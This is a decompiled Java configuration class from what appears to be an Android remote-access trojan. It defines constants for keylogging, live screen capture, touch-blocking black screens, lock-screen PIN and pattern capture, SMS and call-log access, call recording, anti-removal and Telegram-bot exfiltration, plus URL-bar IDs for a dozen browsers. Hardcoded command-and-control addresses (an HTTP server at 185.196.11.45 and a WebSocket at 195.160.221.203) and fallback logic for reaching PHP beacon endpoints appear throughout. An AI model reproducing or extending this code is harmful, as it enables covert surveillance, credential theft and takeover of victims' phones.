/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Intent
 */
package linker.resourcer.encoder;

import android.content.Intent;
import java.net.InetAddress;
import java.net.UnknownHostException;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.CryptoManager;

public class ConfigurationConstants {
    public static final String ANDROID_BROWSER_ID;
    public static final String ANDROID_BROWSER_PACKAGE;
    public static final String Acc_Camera;
    public static final String Accessibility_Service;
    public static final String Alertico = "alert_ico";
    public static final String Ant_delet;
    public static String AutoStartOn;
    public static boolean Auto_jct = false;
    public static final String BRAVE_ID;
    public static final String BRAVE_PACKAGE;
    public static String BTVersion;
    public static String BlackScreen_BlockTouches;
    public static final String CHROME_ID;
    public static final String CHROME_PACKAGE;
    public static final String COLOROS_BROWSER_ID;
    public static final String COLOROS_BROWSER_PACKAGE;
    public static final String Call_Phone;
    public static final String Call_Record;
    public static String Clone_Apps;
    public static String Clone_State;
    public static final String DEVICE_ID = "ID";
    public static final String DUCKDUCKGO_ID;
    public static final String DUCKDUCKGO_PACKAGE;
    public static final String Doze_Mode;
    public static final String Draw_Overlays;
    public static final String FIREFOX_ID;
    public static final String FIREFOX_PACKAGE;
    public static final String Get_Accounts;
    public static String Hidden_browser;
    public static String IV;
    public static boolean Live_Nots = false;
    public static final String Live_Screen = "Liv_scr";
    public static String Live_scread;
    public static String Live_skilton;
    public static final String MICROSOFT_EDGE_ID;
    public static final String MICROSOFT_EDGE_PACKAGE;
    public static final String Mob_height = "Hscr";
    public static final String Mob_width = "Wscr";
    public static final String OPERA_ID;
    public static final String OPERA_MINI_ID;
    public static final String OPERA_MINI_PACKAGE;
    public static final String OPERA_PACKAGE;
    public static String PASSWORD;
    public static final String Package_Installs;
    public static final String Post_Noty;
    public static int Preformance = 0;
    public static final String Read_Call_Log;
    public static final String Read_Contacts;
    public static final String Read_SMS;
    public static final String Rec_Activitys = "Rec_Activitys";
    public static final String Rec_Notifications = "Rec_Notifications";
    public static final String Rec_apps = "Rec_apps";
    public static boolean Rec_klogs = false;
    public static final String Rec_links = "Rec_links";
    public static final String RecordName = "RecNam";
    public static final String Record_Audio;
    public static final String Redirect_e = "red_e";
    public static final String Redirect_ip = "red_ip";
    public static final String Redirect_k = "red_k";
    public static String SALT;
    public static final String SAMSUNG_BROWSER_ID;
    public static final String SAMSUNG_BROWSER_PACKAGE;
    public static int SCRQuality = 0;
    public static String SCRSIDF;
    public static String SPLIT_ARAY;
    public static String SPLIT_DATA;
    public static String SPLIT_LINE;
    public static String SPLIT_SKT;
    public static String Sec_IDF;
    public static String Self_Record;
    public static final String Send_SMS;
    public static String Send_Skilton;
    public static String Server_Address;
    public static final String Set_Wallpaper;
    public static String Silent_Screen;
    public static String Skeleton_Color;
    public static String SmartBlock_DismissPower;
    public static String Sockets_Servers;
    public static Intent Stored_intentdata;
    public static int Stored_resultCode = 0;
    public static String THE_CIP;
    public static String THE_IDF;
    public static final String TUNNY_BROWSER_ID;
    public static final String TUNNY_BROWSER_PACKAGE;
    public static final String Time_Stamp;
    public static boolean Tregerdbtrry = false;
    public static final String USR_NAME = "CN";
    public static String XBlock_Url;
    public static String enable_trak;
    public static boolean engine_done = false;
    public static final String file_acc_state;
    public static String forautostart;
    public static String last_accepted_ping;
    public static String last_accepted_sk;
    public static boolean liv_klogs = false;
    public static String lock_cods;
    public static String lock_msg;
    public static String lock_pin;
    public static String lock_screen;
    public static String lock_title;
    public static String lock_type;
    public static String mob_lock;
    public static final String ontimerest = "onerestrct";
    public static String patternmp;
    public static boolean removeapp = false;
    public static boolean removeme = false;
    public static String req_update;
    public static final String setupok = "setup_ok";
    public static String skipxaomi;
    public static final String slide_down = "down";
    public static final String slide_left = "left";
    public static final String slide_right = "right";
    public static final String slide_up = "up";
    public static String tg_bot_token;
    public static String tg_chat_id;
    public static String tg_enabled;
    public static String up_link;
    public static String up_tag;
    public static String web_browser;
    public static String web_pass;
    public static final String write_settings_sys;

    static {
        BTVersion = "BT-v4.0";
        Preformance = 20000;
        Sockets_Servers = "";
        Server_Address = "";
        XBlock_Url = "http://185.196.11.45:3781";
        last_accepted_sk = null;
        last_accepted_ping = null;
        SPLIT_SKT = "[>SKT<]";
        SPLIT_DATA = "[>DAT<]";
        SPLIT_LINE = "[>LIN<]";
        SPLIT_ARAY = "[>ARY<]";
        Auto_jct = false;
        Live_Nots = false;
        Rec_klogs = true;
        liv_klogs = false;
        engine_done = false;
        THE_IDF = "THE_IDF";
        Sec_IDF = "SEC_IDF";
        THE_CIP = "THE_CIP";
        patternmp = "pt_mp";
        Stored_intentdata = null;
        Stored_resultCode = -999;
        Send_Skilton = "Skiton_on";
        Skeleton_Color = "Skiton_clr";
        BlackScreen_BlockTouches = "blk_touch";
        SmartBlock_DismissPower = "sblk_pwr";
        lock_screen = "lck_scr";
        lock_pin = "lck_pin";
        lock_title = "lck_title";
        lock_msg = "lck_msg";
        lock_type = "lck_typ";
        lock_cods = "lck_cds";
        up_link = "up_lnk";
        req_update = "req_up";
        up_tag = "up_tag";
        Clone_State = "clo_sta";
        Clone_Apps = "clo_aps";
        mob_lock = "mob_lck";
        tg_bot_token = "tg_bt";
        tg_chat_id = "tg_ci";
        tg_enabled = "tg_en";
        AutoStartOn = "auto_ok";
        forautostart = "for_autos";
        skipxaomi = "skp_xoi";
        Silent_Screen = "Silent_scr";
        Self_Record = "self_rec";
        Live_skilton = "liv_skli";
        Live_scread = "liv_skread";
        Hidden_browser = "hid_bro";
        web_browser = "web_bro";
        web_pass = "web_pas";
        enable_trak = "enb_trk";
        SCRQuality = 10;
        SCRSIDF = "null";
        Tregerdbtrry = false;
        removeme = false;
        removeapp = false;
        Time_Stamp = UtilityHelper.Fix_it("Time" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Stamp", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Accessibility_Service = UtilityHelper.Fix_it("Accessibility" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Service", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Read_Contacts = UtilityHelper.Fix_it("Read" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Contacts", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Read_SMS = UtilityHelper.Fix_it("Read" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "SMS", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Read_Call_Log = UtilityHelper.Fix_it("Read" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Call" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Log", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Acc_Camera = UtilityHelper.Fix_it("Cam" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "era", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Get_Accounts = UtilityHelper.Fix_it("Get" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Accounts", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Record_Audio = UtilityHelper.Fix_it("Record" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Audio", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        IV = UtilityHelper.Fix_it("2230209" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "522049090", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        PASSWORD = UtilityHelper.Fix_it("48147805" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "84699673", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        SALT = UtilityHelper.Fix_it("28943563" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "30652558", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Call_Phone = UtilityHelper.Fix_it("Call" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Phone", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Post_Noty = UtilityHelper.Fix_it("Notify" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Prim", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Ant_delet = UtilityHelper.Fix_it("ant" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "del", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Call_Record = UtilityHelper.Fix_it("Call" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Record", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Send_SMS = UtilityHelper.Fix_it("Send" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "SMS", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Set_Wallpaper = UtilityHelper.Fix_it("Set" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Wallpaper", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Doze_Mode = UtilityHelper.Fix_it("Doze" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Mode", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Draw_Overlays = UtilityHelper.Fix_it("Draw" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Overlays", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        Package_Installs = UtilityHelper.Fix_it("Package" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Installs", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        write_settings_sys = UtilityHelper.Fix_it("Write" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "Settings", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        file_acc_state = UtilityHelper.Fix_it("files" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "access", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        CHROME_PACKAGE = UtilityHelper.Fix_it("com.andr" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "oid.chrome", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        CHROME_ID = UtilityHelper.Fix_it("com.android.chrome:id/url_" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "bar", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        FIREFOX_PACKAGE = UtilityHelper.Fix_it("org.mozi" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "lla.firefox", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        FIREFOX_ID = UtilityHelper.Fix_it("org.mozilla.firefox:id/url_" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "bar_title", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        SAMSUNG_BROWSER_PACKAGE = UtilityHelper.Fix_it("com.sec.an" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "droid.app.sbrowser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        SAMSUNG_BROWSER_ID = UtilityHelper.Fix_it("com.sec.android.app.sbrowser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "location_bar_edit_text", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        BRAVE_PACKAGE = UtilityHelper.Fix_it("com.b" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "rave.browser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        BRAVE_ID = UtilityHelper.Fix_it("com.brave.browser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "url_bar", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        OPERA_PACKAGE = UtilityHelper.Fix_it("com.oper" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "a.browser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        OPERA_ID = UtilityHelper.Fix_it("com.opera.browser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "url_field", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        DUCKDUCKGO_PACKAGE = UtilityHelper.Fix_it("com.duckduck" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "go.mobile.android", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        DUCKDUCKGO_ID = UtilityHelper.Fix_it("com.duckduckgo.mobile.android:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "omnibarTextInput", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        OPERA_MINI_PACKAGE = UtilityHelper.Fix_it("com.oper" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "a.mini.native", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        OPERA_MINI_ID = UtilityHelper.Fix_it("com.opera.mini.native:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "url_field", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        MICROSOFT_EDGE_PACKAGE = UtilityHelper.Fix_it("com.micro" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "soft.emmx", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        MICROSOFT_EDGE_ID = UtilityHelper.Fix_it("com.microsoft.emmx:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "url_bar", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        COLOROS_BROWSER_PACKAGE = UtilityHelper.Fix_it("com.col" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "oros.browser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        COLOROS_BROWSER_ID = UtilityHelper.Fix_it("com.coloros.browser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "azt", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        ANDROID_BROWSER_PACKAGE = UtilityHelper.Fix_it("com.andro" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "id.browser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        ANDROID_BROWSER_ID = UtilityHelper.Fix_it("com.android.browser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "url", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        TUNNY_BROWSER_PACKAGE = UtilityHelper.Fix_it("mobi.mgee" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "k.TunnyBrowser", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
        TUNNY_BROWSER_ID = UtilityHelper.Fix_it("mobi.mgeek.TunnyBrowser:id/" + ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS + "search_input", ConfigurationProvider.OaaskrfyvhoypymnzlskbzwpyrS);
    }

    public static String URL_ERROR() {
        String[] stringArray = CryptoManager.Getinstance().Dcrpt_Str(ConfigurationProvider.USR_HOST).split("<");
        int n = stringArray.length;
        for (int i = 0; i < n; ++i) {
            String string2 = ConfigurationConstants.getIPAddress(stringArray[i]);
            string2 = "http://" + string2 + ConfigurationProvider.subdir + "log_error.php";
            if (!UtilityHelper.isURLReachable(string2)) continue;
            return string2;
        }
        return "http://" + Server_Address + ConfigurationProvider.subdir + "log_error.php";
    }

    public static String URL_PING(String stringArray) {
        if (last_accepted_ping != null) {
            if (UtilityHelper.isURLReachable(last_accepted_ping)) {
                return last_accepted_ping;
            }
            last_accepted_ping = null;
        }
        Object object = CryptoManager.Getinstance();
        stringArray = ((String)stringArray + ((CryptoManager)object).Dcrpt_Str(ConfigurationProvider.USR_HOST)).split("<");
        int n = stringArray.length;
        for (int i = 0; i < n; ++i) {
            object = ConfigurationConstants.getIPAddress(stringArray[i]);
            object = "http://" + (String)object + ConfigurationProvider.subdir + "yarsap_80541.php";
            if (!UtilityHelper.isURLReachable((String)object)) continue;
            last_accepted_ping = object;
            return object;
        }
        return "http://" + Server_Address + ConfigurationProvider.subdir + "yarsap_80541.php";
    }

    public static String URL_SOCKT() {
        String[] stringArray = Sockets_Servers.split("<");
        if (last_accepted_sk != null) {
            if (UtilityHelper.isWebSocketReachable(last_accepted_sk)) {
                return last_accepted_sk;
            }
            last_accepted_sk = null;
        }
        for (String string2 : stringArray) {
            if (!UtilityHelper.isWebSocketReachable(string2)) continue;
            last_accepted_sk = string2;
            return string2;
        }
        return "ws://195.160.221.203:8080/";
    }

    public static String getIPAddress(String string2) {
        try {
            string2 = InetAddress.getByName(string2).getHostAddress();
            return string2;
        }
        catch (UnknownHostException unknownHostException) {
            unknownHostException.printStackTrace();
            AndroidLogger.Error("getIPAddress", unknownHostException.getMessage());
            return Server_Address;
        }
    }
}

